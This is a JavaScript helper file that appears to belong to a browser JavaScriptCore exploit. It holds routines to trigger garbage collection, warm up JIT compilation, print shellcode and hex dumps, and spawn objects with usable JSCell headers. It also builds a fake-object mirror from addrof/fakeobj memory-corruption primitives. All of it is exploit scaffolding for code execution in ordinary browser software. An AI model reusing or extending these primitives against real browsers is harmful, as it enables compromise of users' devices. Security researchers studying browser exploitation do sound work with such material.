function printf(message, status = 1) {
  let prefixes = ["-", "*", "+"];
  port.postMessage(`[${prefixes[status]}] ${message}`);
}

// Trigger GC
function gc(n = 10000) {
  let tmp = [];
  for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
}

function calculateChunkCount(length) {
  let chunks = 0;
  let total = 8;
  while (total < length) {
    total += 8;
  }
  chunks = total / 8;
  return chunks;
}

function compileFunction() {
  function compiledFunction(num) {
    for (var i = 2; i < num; i++) {
      if (num % i === 0) {
        return false;
      }
    }
    return true;
  }

  for (var i = 0; i < 1000; i++) {
    compiledFunction(i);
  }
  for (var i = 0; i < 1000; i++) {
    compiledFunction(i);
  }

  return compiledFunction;
}

function printRawAssembly(mem) {
  let del = "-".repeat(10);
  let val = `${del} Shellcode start ${del}\n`;
  val += String.fromCharCode(...mem);
  printf(val);
  printf(`${del} Shellcode end ${del}`);
}

function printHexDump(data) {
  let del = "-".repeat(10);
  printf(`${del} Hex Dump Start ${del}\n${hexdump(data)}`);
  printf(`${del} Hex Dump End ${del}`);
}

function callConstructor(ctor, args = []) {
  const concatinatedArgs = [null].concat([].slice.call(args));
  return new (ctor.bind.apply(ctor, concatinatedArgs))();
}

function spawnObject(type, initArgs = []) {
  let header;
  let instance;
  let tries = 0;

  do {
    instance = callConstructor(type, initArgs);
    header = _JSObjectMirror(instance).target.jsCellHeader;
    tries++;
  } while (
    header.byteAt(7) == 0x7f ||
    header.byteAt(7) == 0x40
  );

  printf(`Spawned ${type.name}(${header}) in ${tries} tries`);

  return [header, instance];
}

function getValidHeader(type, initArgs = []) {
  return spawnObject(type, initArgs)[0];
}

function getNonOpaqueObject(type, initArgs = []) {
  return spawnObject(type, initArgs)[1];
}

function _internal_mirror(target) {
  const addr = Add(_internal_primitives.addrof(target), 0x10);
  return _internal_primitives.fakeobj(addr);
}
